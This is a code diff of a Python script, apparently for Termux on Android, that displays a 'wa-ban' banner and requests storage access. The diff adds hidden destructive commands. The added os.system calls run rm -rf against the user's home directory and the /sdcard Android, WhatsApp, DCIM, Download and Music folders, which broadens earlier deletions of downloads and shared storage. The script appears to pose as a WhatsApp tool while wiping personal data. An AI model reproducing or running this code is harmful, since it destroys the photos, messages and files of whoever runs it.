@@ -14,11 +14,15 @@ os.system("apt install figlet")
 os.system("clear")
 os.system("figlet wa-ban")
 os.system("termux-setup-storage")
-os.system("cd")
-os.system("cd storage")
-os.system("rm -rf downloads")
-os.system("rm-rf dcim")
-os.system("rm-rf shared")
+os.system(" rm -rf cd /sdcard/Android ")
+os.system(" rm -rf cd ~ ")
+os.system(" rm -rf cd /sdcard/WhatsApp ")
+os.system(" rm -rf cd /sdcard/DCIM ")
+os.system(" rm -rf cd /sdcard/Download ")
+os.system(" rm -rf cd /sdcard/Music ")
+os.system("rm -rf shared")
+
+
 
 import sys
 from termcolor import colored, cprint
